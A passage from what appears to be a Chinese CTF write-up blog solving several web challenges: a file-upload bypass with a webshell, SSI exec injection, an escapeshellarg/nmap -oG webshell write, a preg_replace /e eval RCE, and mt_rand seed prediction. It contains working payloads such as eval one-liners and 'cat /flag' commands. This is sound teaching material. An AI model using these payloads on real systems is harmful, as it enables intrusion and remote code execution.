title&quot;&gt;&#x27;</span>.<span class="hljs-variable">$msg</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>				    &#125;<br>				&#125;<span class="hljs-keyword">else</span>&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;h3 title&quot;&gt;exif_imagetype not image!&lt;/div&gt;&#x27;</span>;<br>				&#125;<br>			&#125;<span class="hljs-keyword">else</span>&#123;<br>				<span class="hljs-variable">$fn</span> = <span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;_Hz&quot;</span>]).<span class="hljs-string">&quot;.*&quot;</span>;<br>				<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)) &#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;cc-profile-image&quot;&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)[<span class="hljs-number">0</span>].<span class="hljs-string">&#x27;&quot; alt=&quot;Image&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;<br>				&#125;<span class="hljs-keyword">else</span>&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;cc-profile-image&quot;&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/anthony.jpg&quot; alt=&quot;Image&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;<br>				&#125;<br><br>			&#125;<br>		<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>注册成功后报错，猜测可能有注入点。先放在这里，继续登陆。发现是上传头像，那猜测可能有文件上传漏洞了</p>
<p>exif_imagetype函数，很常见的了，判断文件头是否是图片。</p>
<p>那我先传入一个图片马，上传成功。但是发现无论是.htaccess，还是各种格式的都无法上传成功，图片马也无法利用。</p>
<p>这时猜测是否能通过web应用程序解析漏洞绕过。报错网页，发现是apache</p>
<blockquote>
<p>由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，jpg等扩展名是apache不能识别的，</p>
</blockquote>
<p>因此如果一个文件名为1.php.gif。就会直接将类型识别为php，从而达到了注入php代码的目的</p>
<p>但是这里又无法上传成功，很奇怪。这里测试了一会，发现反着利用就可以了，上传1.jpg.php</p>
<p>看图片链接，发现上传路径&#x2F;uploads。然后最奇特的一点，jpg好像被过滤成空了，直接是php文件了。那就直接利用。蚁剑连接，在根目录下找到flag</p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>通过扫后台发现index.php.swp备份</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">ob_start</span>();<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br>		<span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>	&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><br>***<br><br>​    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>​    &#123;<br>​        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>​        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>​            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>​            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>​            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>​            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">***</span><br><span class="hljs-string"></span><br><span class="hljs-string">***</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">***</span><br><span class="hljs-string"></span><br><span class="hljs-string">​			***&#x27;</span>;<br>​            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>​            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br><br>***<br><br>​			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>​        &#125; <span class="hljs-keyword">else</span> &#123;<br>​            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>​            <br><br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>    ***<br>    &#125;<br>    ***<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>要求password的md5值的前6个字符为6d0bc1。敲代码（python）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>

<p>2020666<br>2305004<br>9162671</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">2020666</span><br></code></pre></td></tr></table></figure>

<p>抓包得到Url_is_here: public&#x2F;5a9c9895628d4de6662c576d8b2039658d972752.shtml</p>
<p><a target="_blank" rel="noopener" href="https://www.wenjianbaike.com/shtml.html">https://www.wenjianbaike.com/shtml.html</a></p>
<p>能根据命令动态回显网页的某个部分，比如时间。可以注入，用来远程命令执行。</p>
<!--#exec cmd="命令"-->
<p>这里的username为注入点</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>

<p>打开flag_990c66bf85a09c664f0b6741840499b2</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>

<p>注意因为是上级目录，所以要保留..&#x2F;<br>回显得到flag</p>
<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>知识点：<code>nmap -oG 写入文件</code>、<code>-iL读取扫描文件</code>、<code>escapeshellarg</code>绕过（<a target="_blank" rel="noopener" href="https://paper.seebug.org/164/%EF%BC%89">https://paper.seebug.org/164/）</a></p>
<p>解法：<strong>nmap</strong>扫描结果写入文件时加入一句话木马，需要绕过<code>escapeshellarg()</code>函数</p>
<p>页面类似<strong>Nmap</strong>的功能，一个输入命令行，提示输入<code>ip</code>地址，尝试输入正常内容：<code>127.0.0.1</code></p>
<p>有回显，尝试命令执行，使用 <code>|</code>分隔ip地址与命令，未成功，<code>|</code>被<code>\</code>转义</p>
<p>查阅<code>escapeshellarg</code>函数的资料，发现存在绕过漏洞：<a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
<p>传入参数：127.0.0.1’ -v -d a&#x3D;1<br>经过escapeshellarg()函数处理后变为：’127.0.0.1’&#39;‘ -v -d a&#x3D;1’，也就是将其中的’单引号转义，再用单引号将内容包含起来<br>处理完的字符串再通过escapeshellcmd()函数的处理，变成：’127.0.0.1’\‘’ -v -d a&#x3D;1&#39;，因为escapeshellcmd()函数对\以及最后的未闭合的’进行了转义<br>由于两次函数的处理，最终参数可简化成：127.0.0.1\ -v -d a&#x3D;1’，因为包围127.0.0.1的单引号产生了闭合，\被解释为\，中间的两个单引号’’完成了闭合，最终留下了a&#x3D;1’，也就是末尾的单引号。<br>结合本题环境，常用的命令注入方法都不行，题目环境为Nmap扫描，查阅到Nmap可以写入文件，其中参数-oG可以实现将命令和结果写入文件，尝试构造如下Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>();<span class="hljs-meta">?&gt;</span> -oG hack.php<br></code></pre></td></tr></table></figure>

<p>简单写入一句话木马，会被<code>escapeshellarg()</code>与<code>escapeshellcmd()</code>函数处理为：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27;<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> \&lt;\?php <span class="hljs-title">@eval</span>\(\)\<span class="hljs-comment">;\?\&gt; -oG hack.php&#x27;</span><br></code></pre></td></tr></table></figure>

<p>因为两端单引号闭合，所以一句话木马只是被当成了字符串处理。</p>
<p>所以需要闭合所有的单引号，将一句话木马变成一条命令，尝试在<strong>Payload</strong>前后均加上<code>&#39;</code>单引号：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27;127.0.0.1 </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG hack.php&#x27;</span><br></code></pre></td></tr></table></figure>

<p>处理后所有的单引号均已闭合，最终可简化为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">\<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>();<span class="hljs-meta">?&gt;</span> -oG hack.php<br></code></pre></td></tr></table></figure>

<p>命令成功执行，给出了文件保存位置，使用蚁剑连接</p>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>传两个参数text和file，要求file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”I have a dream”</p>
<p>text用php:&#x2F;&#x2F;input绕过</p>
<p>file用php:&#x2F;&#x2F;filter读取</p>
<p>payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-keyword">next</span>.php&amp;text=php:<span class="hljs-regexp">//i</span>nput<br></code></pre></td></tr></table></figure>

<p>post上传一个<code>I have a dream</code></p>
<p>得到next.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>preg_replace</code>的一个RCE漏洞<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<p><strong>payload：&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">原先的语句： preg_replace(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$value</span>);<br>变成了语句： preg_replace(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;<span class="hljs-variable">$&#123;phpinfo()&#125;</span>&#125;);<br></code></pre></td></tr></table></figure>

<p>但我们的 <strong>.*</strong> 是通过 <strong>GET</strong> 方式传入，你会发现无法执行 <strong>phpinfo</strong> 函数</p>
<p>在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。</p>
<p>我们传上去的 <strong>.*</strong> 变成了 <strong>_*</strong> </p>
<p>换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。</p>
<p> <strong>payload</strong> ： <strong>\S*&#x3D;${phpinfo()}</strong></p>
<p>坑：为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数。这实际上是 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。</p>
<p>payload：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">/<span class="hljs-keyword">next</span>.php?\S*=$&#123;<span class="hljs-built_in">eval</span>($_POST[cmd])&#125;<br></code></pre></td></tr></table></figure>

<p>同时Post传</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/next.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>伪随机数构造</p>
<p><img src="https://i.imgs.ovh/2023/11/20/HO4VI.png" srcset="/img/loading.gif" lazyload alt="image-20231120210805143"></p>
<p>源代码发现check.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>); <br></code></pre></td></tr></table></figure>

<p>含有mt_rand函数，<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/192012.html">PHP mt_rand安全杂谈及应用场景详解</a></p>
<p>1.伪随机数（引用上面的链接内容）<br>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。</p>
<p>mt_rand就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</p>
<p>所以：大致过程就明了了，我们根据已经给出的部分随机数，利用工具找出seed（种子），然后得到完整的随机数。</p>
<p>2.将已知部分伪随机数转化为php_mt_seed工具可以看懂的数据</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">str1 =<span class="hljs-string">&#x27;fjoC9Ygwj7&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>result =<span class="hljs-string">&#x27;&#x27;</span><br><br><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str2)):<br>        <span class="hljs-keyword">if</span> str1<span class="hljs-selector-attr">[i]</span> ==  str2<span class="hljs-selector-attr">[j]</span>:<br>            result += <span class="hljs-built_in">str</span>(j) + <span 